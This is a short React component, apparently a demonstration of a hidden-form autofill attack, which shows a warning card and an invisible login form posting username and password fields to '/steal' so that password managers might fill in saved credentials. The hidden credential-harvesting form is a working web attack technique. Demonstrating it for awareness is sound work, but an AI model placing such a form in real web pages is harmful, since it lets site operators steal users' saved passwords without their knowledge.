export default function HiddenPhish() {
  return (
    <div className="w-full max-w-md bg-red-50 shadow-md rounded-2xl p-6 opacity-60">
      <h2 className="text-lg font-semibold text-red-600 mb-4">
        ⚠️ Hidden Autofill Attack (Demonstration)
      </h2>
      <p className="text-sm text-gray-700 mb-2">
        This form is invisible to users but password managers might still
        autofill credentials here.
      </p>

      {/* This form is hidden with CSS (could be display:none or off-screen) */}
      <form action="/steal" method="POST" className="space-y-2 opacity-0 pointer-events-none absolute">
        <input type="text" name="username" autoComplete="username" />
        <input type="password" name="password" autoComplete="current-password" />
        <button type="submit">Steal</button>
      </form>
    </div>
  );
}
